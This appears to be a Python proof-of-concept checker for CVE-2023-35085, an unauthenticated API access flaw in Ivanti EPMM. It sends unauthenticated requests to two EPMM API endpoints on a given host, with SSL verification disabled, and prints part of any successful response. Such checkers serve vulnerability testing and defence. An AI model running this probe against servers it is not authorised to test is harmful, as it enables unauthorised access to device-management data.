import requests
import sys
import argparse
from urllib.parse import urljoin
import warnings

# 禁用 InsecureRequestWarning 警告
warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

def check_vulnerability(target_url):
    """
    Tries to access known vulnerable API endpoints for CVE-2023-35085.
    """
    vulnerable_endpoints = [
        "/mifs/aad/api/v2/ping",
        "/mifs/aad/api/v2/session/useragents"
        # Add other potential endpoints if known
    ]

    vulnerable = False
    print(f"[*] Checking target: {target_url}")

    for endpoint in vulnerable_endpoints:
        full_url = urljoin(target_url, endpoint)
        print(f"[*] Testing endpoint: {full_url}")
        try:
            # 发送 GET 请求，不进行身份验证，不验证 SSL 证书
            response = requests.get(full_url, verify=False, timeout=15)

            # 检查响应状态码和内容（根据漏洞细节调整判断逻辑）
            # 对于 /ping，成功访问可能返回 200 OK 和特定内容
            # 对于 /useragents，成功可能返回 200 OK 和 JSON 数据
            # 关键在于未经身份验证就收到了成功的响应 (通常是 200 OK)
            if response.status_code == 200:
                print(f"[+] SUCCESS! Endpoint {endpoint} is accessible without authentication (Status: {response.status_code}).")
                print(f"[*] Response snippet (first 100 chars): {response.text[:100]}...")
                vulnerable = True
                # 找到一个即可证明漏洞存在，可以停止检查其他端点
                # break
            elif response.status_code == 401 or response.status_code == 403:
                 print(f"[-] Endpoint {endpoint} seems protected (Status: {response.status_code}).")
            else:
                 print(f"[-] Endpoint {endpoint} returned status {response.status_code}.")

        except requests.exceptions.Timeout:
            print(f"[!] Timeout while connecting to {full_url}.")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error connecting to {full_url}: {e}")
        except Exception as e:
            print(f"[!] An unexpected error occurred: {e}")

    if vulnerable:
        print(f"\n[+] Target {target_url} appears to be VULNERABLE to CVE-2023-35085 (unauthenticated API access).")
    else:
        print(f"\n[-] Target {target_url} does not seem to be vulnerable based on tested endpoints, or the service is down/inaccessible.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Proof-of-Concept checker for CVE-2023-35085 (Ivanti EPMM Unauthenticated API Access)")
    parser.add_argument("target", help="Target URL (e.g., https://epmm.example.com)")
    parser.add_argument("-p", "--port", type=int, help="Optional target port if not standard 443/80")

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    args = parser.parse_args()

    target_url = args.target
    # 如果 URL 没有协议头，默认添加 https
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "https://" + target_url

    # 处理可选端口
    if args.port:
         from urllib.parse import urlparse, urlunparse
         parsed_url = urlparse(target_url)
         # 替换 netloc 部分以包含端口
         netloc_parts = parsed_url.netloc.split(':')
         new_netloc = f"{netloc_parts[0]}:{args.port}"
         # 重新构建 URL
         target_url = urlunparse((parsed_url.scheme, new_netloc, parsed_url.path, parsed_url.params, parsed_url.query, parsed_url.fragment))


    check_vulnerability(target_url)
input("脚本运行完毕，按 Enter 键退出...")